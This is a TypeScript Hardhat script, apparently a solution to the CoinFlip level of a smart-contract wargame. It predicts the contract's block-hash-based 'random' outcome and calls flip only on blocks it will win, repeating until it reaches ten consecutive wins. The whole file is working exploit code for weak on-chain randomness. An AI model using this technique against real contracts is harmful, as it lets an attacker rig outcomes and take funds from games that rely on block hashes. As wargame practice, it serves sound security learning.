import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { ethers } from "hardhat"
import { COINFLIP } from "../constants"
import { CoinFlip } from "../typechain-types"

const FACTOR = ethers.BigNumber.from(
    "57896044618658097711785492504343953926634992332820282019728792003956564819968"
)
const shouldPlay = async () => {
    const currentBlockNum = await ethers.provider.getBlockNumber()
    const blockHash = (await ethers.provider.getBlock(currentBlockNum)).hash
    const blockValue = ethers.BigNumber.from(blockHash)
    const randNumberExploit = blockValue.div(FACTOR).toString()
    const play = randNumberExploit == "1"
    if (play) {
        console.log(`exploit block number ${currentBlockNum}`)
    }
    return play
}

const listenToBlocks = async (
    maxTries: number,
    targetWins: number,
    coinflip: CoinFlip,
    deployer: SignerWithAddress
) => {
    let numPlay = 0
    let numTries = 0
    await new Promise((resolve, reject) => {
        ethers.provider.on("block", async (blockNumber) => {
            console.log(`current block number ${blockNumber}`)

            const play = await shouldPlay()
            if (play) {
                await coinflip.connect(deployer).flip(true)
                numPlay++
            }
            numTries++

            console.log("num play", numPlay)
            console.log("num tries", numTries)
            if (numPlay == targetWins) {
                resolve(0)
            }
            if (numTries > maxTries) {
                reject("too many tries")
            }
        })
    })
}

const exploitCoinflip = async () => {
    let deployer = (await ethers.getSigners())[0]

    // fetch the contract
    const coinflip: CoinFlip = await ethers.getContractAt("CoinFlip", COINFLIP)

    await listenToBlocks(100, 10, coinflip, deployer)
    

    const consecutiveWins = await coinflip.consecutiveWins()
    console.log(`consecutive wins ${consecutiveWins}`)
}

exploitCoinflip()
    .then(() => {
        console.log("coinflip explpited successfully")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
